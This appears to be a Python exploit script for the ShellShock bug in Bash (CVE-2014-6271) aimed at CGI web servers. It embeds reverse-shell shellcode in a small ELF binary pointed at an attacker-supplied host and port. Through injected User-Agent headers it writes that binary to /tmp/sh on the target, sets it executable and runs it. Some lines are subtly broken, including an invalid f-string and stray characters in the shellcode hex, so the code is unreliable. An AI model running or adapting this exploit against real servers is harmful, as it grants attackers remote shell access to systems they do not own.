#!/usr/bin/python3
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150401.1
# Licence: WTFPL - wtfpl.net

import requests
import struct
import socket
import sys

__version__ = "20150401.1"

def banner():
    print(f"""\x1b[1;31m
   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█          ▄████████    ▄█    █▄     ▄██████▄   ▄████████    ▄█   ▄█▄ 
  ███    ███   ███    ███     ███    ███ ███       ███         ███    ███   ███    ███   ███    ███ ███    ███   ███ ▄███▀ 
  ███    █▀    ███    ███     ███    █▀  ███       ███         ███    █▀    ███    ███   ███    ███ ███    █▀    ███▐██▀   
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███         ███         ▄███▄▄▄▄███▄▄ ███    ███ ███         ▄█████▀    
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███       ▀███████████ ▀▀███▀▀▀▀███▀  ███    ███ ███        ▀▀█████▄    
         ███   ███    ███     ███    █▄  ███       ███                ███   ███    ███   ███    ███ ███    █▄    ███▐██▄   
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄    ▄█    ███   ███    ███   ███    ███ ███    ███   ███ ▀███▄ 
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██  ▄████████▀    ███    █▀     ▀██████▀  ████████▀    ███   ▀█▀ 
                                         ▀         ▀                                                             ▀         
               Bash/HTTPd ShellShock Remote Code Execution Exploit, CVE-2014-6271 Version: {__version__}
    \x1b[0m""")

def u32h(v):
    return struct.pack("<L", v).hex()

def u32(v, hex=False):
    return struct.pack("<L", v)

def make_elf(sc):
    elf_head = (
        "7f454c46010101000000000000000000" +
        "02000300010000005480040834000000" +
        "00000000000000003400200001000000" +
        "00000000010000000000000000800408" +
        "00800408" + u32h(0x54+len(sc))*2  +
        "0500000000100000"
    )
    return bytes.fromhex(elf_head) + sc

def gen_backconnect(cbhost, cbport):
    print(f"{!} cbhost: " + cbhost)
    print(f"{!} cbport: " + cbport)
    cback = (
        "31c031db31c951b10651b10151b10251" +
        "89e1b301b066cd8089c231c031c95151" +
        "68badc0ded6668b0efb102665189e7b3" +
        "1053575289e1b303b066cd8031c939c1" +
        "740631c0b001cd8031c0b03f89d3cd80" +
        "31c0b03f89d3b101cd8031c0b03f89d3" +
        "b102cd8031c031d250686e2f7368682f" +
        "//626989e3505389e1b00bcd8031c0b0" +
        "01cd80"
    )
    cback = cback.replace("badc0ded", socket.inet_aton(cbhost).hex())
    cback = cback.replace("b0ef", struct.pack(">H", int(cbport)).hex())
    shellcode = make_elf(bytes.fromhex(cback))
    tmp = ''.join([f"\\x{byte:02x}" for byte in shellcode])
    shell = tmp.replace("\\", "\\\\")
    return shell

def hacko_el_planito(url, cbhost, cbport):
    print("{+} Dr0psh3llz!")
    useragent = f"""() {{ :; }}; echo -ne {gen_backconnect(cbhost, cbport)}>/tmp/sh"""
    headers = {'User-Agent': useragent}
    r = requests.get(url=url, headers=headers, verify=False)
    print("{*} chmoddin dat bznz")
    useragent2 = """() { :; }; /bin/chmod 777 /tmp/sh"""
    r = requests.get(url=url, headers={'User-Agent': useragent2}, verify=False)
    print("{>} Triggering backconnect!")
    useragent3 = """() { :; }; /tmp/sh"""
    r = requests.get(url=url, headers={'User-Agent': useragent3}, verify=False)

if __name__ == "__main__":
    banner()
    if len(sys.argv) != 4:
        sys.exit(f"Usage: {sys.argv[0]} http://example.com/cgi-bin/vuln hacki.ng 1337")
    hacko_el_planito(url=sys.argv[1], cbhost=sys.argv[2], cbport=sys.argv[3])